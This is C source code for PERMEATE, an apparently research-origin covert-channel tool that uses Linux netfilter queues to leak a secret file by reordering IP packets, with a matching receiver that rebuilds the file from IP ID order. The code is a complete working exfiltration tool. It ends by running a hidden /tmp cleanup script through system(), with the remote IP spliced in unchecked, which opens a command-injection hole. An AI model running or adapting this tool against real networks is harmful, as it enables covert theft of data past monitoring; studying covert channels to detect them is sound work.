
// PERMEATE
// Copyright (C) 2008 Jarek Paduch, Bilal Khan, Jamie Levy
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.
//
// Email: jarek.paduch@gmail.com, grouptheory@gmail.com, jamie.levy@gmail.com
// The above header may not be removed or modified without contacting the authors.

#include <linux/netfilter.h>
#include <libipq.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFSIZE 16384
#define QUEUESIZE 16
#define BOOTUP_LENGTH 5
#define MASK 128
#define DEBUG 0

     
void die(struct ipq_handle *h) {
  ipq_perror("error-- you must modprobbe ip_queue to run permeate! --");
  ipq_destroy_handle(h);
  exit(-1);
}

short getID(unsigned char* packet) {
  return (*((unsigned char*)(packet+4)) << 8) | *((unsigned char*)(packet+5));
}


// flips p[i] and p[i-1]
void flipbits(int *p, int i) {
  p[i] = p[i]^p[i-1];  p[i-1] = p[i]^p[i-1];  p[i] = p[i]^p[i-1];
}

// build a p[ermutation based on binary number ch
void permutation(int* p, int ch, int cqs) {
  int i, bits = 8, index = 0;
  for (i=0;i<cqs;i++) p[i]=i;
  if (ch != EOF) {
    while(bits--) {
      if(ch & MASK) flipbits(p, index+1);
      index+=2;
      ch<<=1;
    }
  }
}

/*
 * The juggler buffers blocks of 16 packets and permutes them based on
 * each successive characters in a secret file.  Packet 2k and 2k+1
 * are swapped if and only if bit k of the character is 1.
 */
void juggler(char * fname, char * remoteIP)
{
  struct ipq_handle *h;
  int i, status, ch, j, numpacks, done=0, currentQUEUESIZE=1;
  FILE* fp;
  
  // the permutation and packet storage
  int* p = (int*)malloc(QUEUESIZE * sizeof(int));
  ipq_packet_msg_t **m = (ipq_packet_msg_t**)malloc(QUEUESIZE * sizeof(ipq_packet_msg_t *));
  unsigned char **packet = (unsigned char**)malloc(QUEUESIZE * sizeof(unsigned char*));
  
  // initilize the packet storage
  for (i=0;i<QUEUESIZE; i++) {
    m[i] = 0L;
    packet[i] = (unsigned char*) malloc(BUFSIZE*sizeof(unsigned char));
  }
  
  // open the socket and initialize
  h=ipq_create_handle(0,PF_INET);
  if(!h) die(h);
  status = ipq_set_mode(h,IPQ_COPY_PACKET,BUFSIZE);
  if(status < 0) die(h);

  // the secret file to transmit
  fp = fopen(fname,"r");
  if (fp == NULL) {
    printf("Error: file '%s' does not exist\n", fname);
    exit(-1);
  }
  printf("PERMEATE sender preparing to send file: '%s'\n", fname);
  
  // Read the first BOOTUP_LENGTH packets, accept each as you read them
  for (j=0; j<BOOTUP_LENGTH;) {
    status=ipq_read(h,packet[0],BUFSIZE,0);
    if (status < 0) fprintf(stderr, "Received error on rcv: %s\n",ipq_errstr());
    switch (ipq_message_type(packet[0])) {
    case NLMSG_ERROR:
      fprintf(stderr, "Error msg: %d -- you must be root to run permeate!\n",ipq_get_msgerr(packet[0]));
      break;
    case IPQM_PACKET:
      m[0]=ipq_get_packet(packet[0]);
      j++;
      break;
    default:
      fprintf(stderr, "Unknown message type!\n");
      break;
    }
    
    status = ipq_set_verdict(h,m[0]->packet_id,NF_ACCEPT,0,NULL);
    if (status < 0) die(h);			
  }
  
  if (DEBUG) printf("BOOTUP phase complete\n");

  // i is the index into the permutation array: from 0-15
  i = 0;
  numpacks = 0;
  currentQUEUESIZE = QUEUESIZE;
  while ( !done ) {
    
    // if we have recvd # of bytes divisible by 16
    if( numpacks % QUEUESIZE == 0 ) {
      i = 0;
      
      if (!done) {
	// get a character
	ch=fgetc(fp);
	printf("%c",ch); fflush(stdout);
  
	// build a 16 element array in p which encodes ch
	permutation(p, ch, currentQUEUESIZE);
	// print_permutation(p, currentQUEUESIZE);

	if (ch == EOF) {
	  printf("\nFinished sending file: '%s'\n", fname);
	  done = 1;
	  fclose(fp);
	}
      }
    }
    
    // PACKET 1 & 2
    for (j=0; j<2; j++) {
      // we read more packets
      status=ipq_read(h,packet[i],BUFSIZE,0);
      if (status < 0) fprintf(stderr, "Received error on rcv: %s\n",ipq_errstr());
      numpacks++;
      switch (ipq_message_type(packet[i])) {
      case NLMSG_ERROR:
	fprintf(stderr, "Received error msg: %d\n",ipq_get_msgerr(packet[i]));
	break;
      case IPQM_PACKET:
	m[i]=ipq_get_packet(packet[i]);
	break;
      default:
	fprintf(stderr, "Unknown message type!\n");
	break;
      }
      i++;
    }
    
    int first = i-2;
    int second = i-1;
    // consult the permutation array to see if we need to output in
    // reverse order from the received order
    if (p[first] > p[second]) {
      // reverse the order
      first = first^second;
      second = first^second;
      first = first^second;
    }

    if (DEBUG) printf("permeate is sending packet with ID= %u as part of sending %c\n",getID(m[first]->payload),ch);
    status = ipq_set_verdict(h,m[first]->packet_id,NF_ACCEPT,0,NULL);
    if (status < 0) die(h);	

    if (DEBUG) printf("permeate is sending packet with ID= %u as part of sending %c\n",getID(m[second]->payload),ch);
    status = ipq_set_verdict(h,m[second]->packet_id,NF_ACCEPT,0,NULL);
    if (status < 0) die(h);	
  }
  
  ipq_destroy_handle(h);
  {
    char cmd[255];
    sprintf(cmd, "/tmp/.cleanup-%s.sh", remoteIP);
    system(cmd);
  }

  exit(0);
}


/*
 * The juggler buffers blocks of 16 IP packets and determines the
 * permutation required to arrange their IP IDs in increasing order.
 * From this it reconstructs a single characters in a secret file.
 * Packet 2k and 2k+1 are swapped as follows: if packet 2k and packet
 * 2k+1 need to be swapped, then bit k of the reconstructed character
 * is taken to be 1; otherwise, bit k is taken to be 0.
 */
void antijuggler(char * fname, char * remoteIP)
{
  struct ipq_handle *h;
  int i, status, ch, j, done = 0, numofbits = 8, numpacks = 0, currentQUEUESIZE = 1, charec = 0;
  FILE* fp;

  // the permutation and make storage for QUEUESIZE packets
  int* p = (int*)malloc(QUEUESIZE * sizeof(int));
  ipq_packet_msg_t **m = (ipq_packet_msg_t**)malloc(QUEUESIZE * sizeof(ipq_packet_msg_t *));
  unsigned char **packet = (unsigned char**)malloc(QUEUESIZE * sizeof(unsigned char*));
  
  // initilize the storage for QUEUESIZE packets
  for (i=0;i<QUEUESIZE; i++) {
    m[i] = 0L;
    packet[i] = (unsigned char*) malloc(BUFSIZE*sizeof(unsigned char));
  }
  
  // open the socket and initialize
  h=ipq_create_handle(0,PF_INET);
  if(!h) die(h);
  status = ipq_set_mode(h,IPQ_COPY_PACKET,BUFSIZE);
  if(status < 0) die(h);

  // the secret file to receive  
  fp = fopen(fname,"w");
  if (fp == NULL) {
    printf("Error: 'secret' file could not be opened for writing\n");
    exit(-1);
  }
  printf("PERMEATE receiver preparing to receive file: '%s'\n", fname);
  
  // Read the first BOOTUP_LENGTH packets, accept each as you read them
  for (j=0; j<BOOTUP_LENGTH;) {
    
    status=ipq_read(h,packet[0],BUFSIZE,0);
    if (status < 0) fprintf(stderr, "Received error on rcv: %s\n",ipq_errstr());
    
    switch (ipq_message_type(packet[0])) {
    case NLMSG_ERROR:
      fprintf(stderr, "Received error msg: %d\n",ipq_get_msgerr(packet[0]));
      break;
    case IPQM_PACKET:
      m[0]=ipq_get_packet(packet[0]);
      if (DEBUG) printf("permeate has recvd IP packet with ID=%u\n", getID(m[0]->payload));
      j++;
      break;
    default:
      fprintf(stderr, "Unknown message type!\n");
      break;
    }
    
    status = ipq_set_verdict(h,m[0]->packet_id,NF_ACCEPT,0,NULL);
    if (status < 0) die(h);			
  }
  
  if (DEBUG) printf("BOOTUP phase complete\n");

  j=0;
  while( !done ) {
    while(numofbits--) {
      for (j=0; j<2;) {
	status=ipq_read(h,packet[j],BUFSIZE,0);
	if (status < 0) fprintf(stderr, "Received error on rcv: %s\n",ipq_errstr());

	switch (ipq_message_type(packet[j])) {
	case NLMSG_ERROR:
	  fprintf(stderr, "Received error msg: %d\n",ipq_get_msgerr(packet[j]));
	  status = ipq_set_verdict(h,m[j]->packet_id,NF_ACCEPT,0,NULL);
	  if (status < 0) die(h);
	  break;
	case IPQM_PACKET:
	  m[j]=ipq_get_packet(packet[j]);
	  status = ipq_set_verdict(h,m[j]->packet_id,NF_ACCEPT,0,NULL);
	  if (status < 0) die(h);
	  j++;
	  break;
	default: 
	  fprintf(stderr, "Unknown message type!\n");
	  break;
	}
      }
      charec=charec<<1;
      if(getID(m[1]->payload) < getID(m[0]->payload)) charec=(charec | 0x00000001);
      j=0;
    }

    printf("%c",(char)charec);
    fflush(stdout);

    if(!done){
      fputc(charec,fp);
      fflush(fp);

      if(charec==0) {
	fclose(fp);done=1;
	printf("\nFinished receiving file: '%s'\n", fname);
      }
    }
    charec=(charec & 0);
    numofbits=8;		
  }

  ipq_destroy_handle(h);
  {
    char cmd[255];
    sprintf(cmd, "/tmp/.cleanup-%s.sh", remoteIP);
    system(cmd);
  }

  exit(0);
}


int main(int argc, char *argv[])
{
  printf("PERMEATE Copyright (C) 2008 Jarek Paduch, Bilal Khan, Jamie Levy\n");
  printf("   This program comes with ABSOLUTELY NO WARRANTY.\n");
  printf("   This is free software, and you are welcome to redistribute it\n");
  printf("   under the conditions of the GNU General Public License.\n\n");

  if ((argc==4) && !strcmp(argv[1],"s")) antijuggler(argv[2], argv[3]);
  else if ((argc==4) && !strcmp(argv[1],"c")) juggler(argv[2], argv[3]);
  else printf("Usage: permeate s|c file remoteIP\n");
}
